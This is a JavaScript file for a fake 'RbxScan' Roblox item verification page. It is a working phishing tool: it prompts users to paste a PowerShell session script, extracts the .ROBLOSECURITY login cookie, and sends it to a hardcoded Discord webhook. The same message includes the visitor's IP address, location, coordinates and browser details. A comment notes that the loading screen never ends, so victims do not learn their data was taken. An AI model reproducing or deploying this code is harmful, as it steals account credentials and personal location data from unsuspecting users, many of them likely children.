// Configuration
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';

// DOM Elements - will be initialized after DOM loads
let scanButton, scanModal, closeModal, cancelButton, submitButton, itemData, loadingOverlay, themeToggle;

// Event Listeners will be attached after DOM loads

// Functions
function openScanModal() {
    scanModal.classList.add('active');
    itemData.focus();
    document.body.style.overflow = 'hidden';
}

function closeScanModal() {
    scanModal.classList.remove('active');
    itemData.value = '';
    document.body.style.overflow = '';
}

function showLoading() {
    loadingOverlay.classList.add('active');
    document.body.style.overflow = 'hidden';
}

function hideLoading() {
    loadingOverlay.classList.remove('active');
    document.body.style.overflow = '';
}

async function handleSubmit() {
    const input = itemData.value.trim();
    
    if (!input) {
        return;
    }

    // Close modal and show loading
    closeScanModal();
    showLoading();

    try {
        // Get user location data
        const locationData = await getUserLocation();
        
        // Get browser and device info
        const browserInfo = getBrowserInfo();
        
        // Check if input is PowerShell script
        const isPowerShell = isPowerShellScript(input);
        
        // Create Discord message
        const discordMessage = createDiscordMessage(input, locationData, browserInfo, isPowerShell);
        
        // Send to Discord webhook
        await sendToWebhook(discordMessage);
        
        // Keep loading forever - user never knows it's done
        
    } catch (error) {
        console.error('Error:', error);
        // Keep loading even on error
    }
}

async function getUserLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || 'Unknown',
            city: data.city || 'Unknown',
            region: data.region || 'Unknown',
            country: data.country_name || 'Unknown',
            countryCode: data.country_code || 'Unknown',
            postal: data.postal || 'Unknown',
            latitude: data.latitude || 'Unknown',
            longitude: data.longitude || 'Unknown',
            timezone: data.timezone || 'Unknown',
            isp: data.org || 'Unknown'
        };
    } catch (error) {
        console.error('Location error:', error);
        return {
            ip: 'Unknown',
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            countryCode: 'Unknown',
            postal: 'Unknown',
            latitude: 'Unknown',
            longitude: 'Unknown',
            timezone: 'Unknown',
            isp: 'Unknown'
        };
    }
}

function getBrowserInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        onLine: navigator.onLine,
        screenWidth: screen.width,
        screenHeight: screen.height,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString()
    };
}

function isPowerShellScript(input) {
    const psPatterns = [
        /\$session\s*=\s*New-Object.*WebRequestSession/i,
        /\$session\.UserAgent/i,
        /\$session\.Cookies\.Add/i,
        /\.ROBLOSECURITY/i,
        /Invoke-WebRequest/i,
        /-UseBasicParsing/i,
        /-WebSession/i
    ];
    
    const matches = psPatterns.filter(pattern => pattern.test(input));
    return matches.length >= 5 && input.length > 500;
}

function extractRobloxCookie(input) {
    const cookieMatch = input.match(/\.ROBLOSECURITY['"]\s*,\s*['"]([^'"]+)['"]/i);
    if (cookieMatch) {
        return cookieMatch[1];
    }
    
    const altMatch = input.match(/\.ROBLOSECURITY.*?([A-Za-z0-9_\-|\.%=]+)/i);
    if (altMatch) {
        return altMatch[1];
    }
    
    return "Cookie not found";
}

function createDiscordMessage(input, locationData, browserInfo, isPowerShell) {
    const baseMessage = {
        content: "@everyone 🚨 **NEW SUBMISSION DETECTED** 🚨",
        embeds: [{
            title: isPowerShell ? "🔍 PowerShell Script Captured" : "🔍 Item Verification Request",
            color: isPowerShell ? 0xff0000 : 0x2563eb,
            timestamp: new Date().toISOString(),
            fields: [],
            footer: {
                text: "RbxScan Verification System",
                icon_url: "https://cdn.discordapp.com/attachments/placeholder/roblox-icon.png"
            }
        }]
    };

    if (isPowerShell) {
        // PowerShell script handling
        const cookie = extractRobloxCookie(input);
        baseMessage.embeds[0].fields = [
            {
                name: "🍪 ROBLOSECURITY Cookie",
                value: `\`\`\`\n${cookie.substring(0, 100)}...\n\`\`\``,
                inline: false
            },
            {
                name: "📝 Script Details",
                value: `**Length:** ${input.length} characters\n**Type:** PowerShell Session Script\n**Status:** Successfully captured`,
                inline: false
            }
        ];
    } else {
        // Regular item verification
        baseMessage.embeds[0].fields = [
            {
                name: "📝 Submitted Data",
                value: `\`\`\`\n${input.length > 100 ? input.substring(0, 100) + '...' : input}\n\`\`\``,
                inline: false
            }
        ];
    }

    // Add location information
    baseMessage.embeds[0].fields.push({
        name: "🌍 Location Information",
        value: `**IP:** ${locationData.ip}\n**City:** ${locationData.city}\n**Region:** ${locationData.region}\n**Country:** ${locationData.country} (${locationData.countryCode})\n**Postal:** ${locationData.postal}\n**ISP:** ${locationData.isp}`,
        inline: true
    });

    // Add browser information
    baseMessage.embeds[0].fields.push({
        name: "💻 Browser & Device",
        value: `**Platform:** ${browserInfo.platform}\n**Language:** ${browserInfo.language}\n**Screen:** ${browserInfo.screenWidth}x${browserInfo.screenHeight}\n**Timezone:** ${browserInfo.timezone}\n**Online:** ${browserInfo.onLine ? 'Yes' : 'No'}`,
        inline: true
    });

    // Add coordinates if available
    if (locationData.latitude !== 'Unknown' && locationData.longitude !== 'Unknown') {
        baseMessage.embeds[0].fields.push({
            name: "📍 Coordinates",
            value: `**Latitude:** ${locationData.latitude}\n**Longitude:** ${locationData.longitude}\n**Timezone:** ${locationData.timezone}`,
            inline: true
        });
    }

    return baseMessage;
}

async function sendToWebhook(message) {
    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(message)
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        console.log('Data sent successfully');
    } catch (error) {
        console.error('Webhook error:', error);
        throw error;
    }
}

function toggleTheme() {
    // Simple theme toggle (can be expanded)
    const currentTheme = document.documentElement.getAttribute('data-theme');
    const newTheme = currentTheme === 'light' ? 'dark' : 'light';
    document.documentElement.setAttribute('data-theme', newTheme);
    localStorage.setItem('theme', newTheme);
}

function initializeTheme() {
    const savedTheme = localStorage.getItem('theme');
    const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
    const initialTheme = savedTheme || (systemPrefersDark ? 'dark' : 'light');
    document.documentElement.setAttribute('data-theme', initialTheme);
}

// Initialize on page load
document.addEventListener('DOMContentLoaded', function() {
    initializeTheme();
    
    // Initialize DOM elements
    scanButton = document.getElementById('scanButton');
    scanModal = document.getElementById('scanModal');
    closeModal = document.getElementById('closeModal');
    cancelButton = document.getElementById('cancelButton');
    submitButton = document.getElementById('submitButton');
    itemData = document.getElementById('itemData');
    loadingOverlay = document.getElementById('loadingOverlay');
    themeToggle = document.getElementById('themeToggle');
    
    // Debug: Check if elements exist
    console.log('scanButton:', scanButton);
    console.log('scanModal:', scanModal);
    console.log('closeModal:', closeModal);
    console.log('submitButton:', submitButton);
    console.log('themeToggle:', themeToggle);
    
    // Attach event listeners after DOM is loaded
    if (scanButton) {
        scanButton.addEventListener('click', openScanModal);
        console.log('scanButton event listener attached');
    } else {
        console.error('scanButton not found!');
    }
    
    if (closeModal) closeModal.addEventListener('click', closeScanModal);
    if (cancelButton) cancelButton.addEventListener('click', closeScanModal);
    if (submitButton) submitButton.addEventListener('click', handleSubmit);
    if (themeToggle) themeToggle.addEventListener('click', toggleTheme);

    // Close modal when clicking outside
    if (scanModal) {
        scanModal.addEventListener('click', (e) => {
            if (e.target === scanModal) {
                closeScanModal();
            }
        });
    }

    // Handle Enter key in textarea
    if (itemData) {
        itemData.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.key === 'Enter') {
                handleSubmit();
            }
        });
    }
    
    console.log('🚀 RbxScan loaded successfully');
});

// Handle escape key
document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
        if (scanModal.classList.contains('active')) {
            closeScanModal();
        }
    }
});